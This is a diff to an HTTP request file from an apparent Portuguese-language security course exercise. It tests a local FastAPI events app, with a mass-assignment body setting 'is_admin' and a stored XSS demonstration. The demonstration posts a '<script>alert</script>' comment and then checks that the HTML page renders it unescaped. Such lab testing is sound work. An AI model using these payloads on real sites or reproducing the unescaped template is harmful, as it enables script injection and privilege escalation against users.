@@ -270,3 +270,48 @@ Authorization: Bearer {{token_dono_a}}
   "campo_hack": "malicioso",
   "is_admin": true
 }
+
+### ==========================================================
+### Testes TP3 - Exercício 5 (Demonstração de Stored XSS)
+### ==========================================================
+
+### 1. Login do Parceiro M2M (Solicita apenas o escopo de leitura em contrato)
+# @name loginM2M
+POST http://127.0.0.1:8000/user/login
+Content-Type: application/x-www-form-urlencoded
+
+username=parceiro_m2m@empresa.com&password=senha_m2m&scope=events:write
+
+> {%
+    client.global.set("token_m2m", response.body.access_token);
+%}
+
+### 2. Criar um novo evento (com escopo de escrita)
+POST http://127.0.0.1:8000/events/new
+Content-Type: application/json
+Authorization: Bearer {{token_m2m}}
+
+{
+  "id": 99,
+  "title": "FastAPI XSS Meetup",
+  "date": "2026-12-01",
+  "organizer": "Organizador_A",
+  "image": "https://example.com/image.png",
+  "description": "Evento para testes de segurança (XSS).",
+  "tags": ["segurança", "xss"],
+  "location": "Rio de Janeiro"
+}
+
+### 1. Atacante injeta um payload malicioso persistente (Stored)
+POST http://127.0.0.1:8000/events/99/comments
+Content-Type: application/json
+
+{
+  "text": "<script>alert('Stored XSS Executado via Jinja2 Safe!')</script>"
+}
+
+### 2. Vítima acessa a página de detalhes do evento
+# Inspecione o HTML retornado. A tag <script> estará intacta dentro do <li>,
+# comprovando que o navegador executará o código ao processar a página.
+GET http://127.0.0.1:8000/events/html/view/99
+Accept: text/html
